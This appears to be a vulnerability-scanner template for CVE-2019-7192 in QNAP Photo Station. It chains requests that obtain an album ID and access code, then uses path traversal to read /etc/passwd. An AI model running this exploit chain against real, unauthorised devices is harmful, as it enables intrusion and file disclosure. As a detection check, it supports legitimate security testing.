name: yaml-poc-qnap-qts-unauthorized_access-CVE-2019-7192
binding: 72bf4075-64c7-4dc3-bbeb-209c7c9bbb6f
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html
        - https://nvd.nist.gov/vuln/detail/CVE-2019-7192
        - https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html
        - https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
    vulnerability:
        id: 0c39785c-9a80-4b40-a15b-cd7c96761d0d
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /photo/p/api/album.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: a=setSlideshow&f=qsamplealbum
        expression: response.status == 200
        output:
            search: '"<output>(?P<album_id>.*?)</output>".bsubmatch(response.body)'
            album_id: search["album_id"]
    r1:
        request:
            cache: true
            method: GET
            path: /photo/slideshow.php?album={{album_id}}
        expression: response.status == 200
        output:
            search: '"encodeURIComponent\\(\\''(?P<access_code>.*?)\\''\\)".bsubmatch(response.body)'
            access_code: search["access_code"]
    r2:
        request:
            cache: true
            method: POST
            path: /photo/p/api/video.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
        expression: response.status == 200 && response.body.bcontains(b"admin:x:0:0")
expression: r0() && r1() && r2()
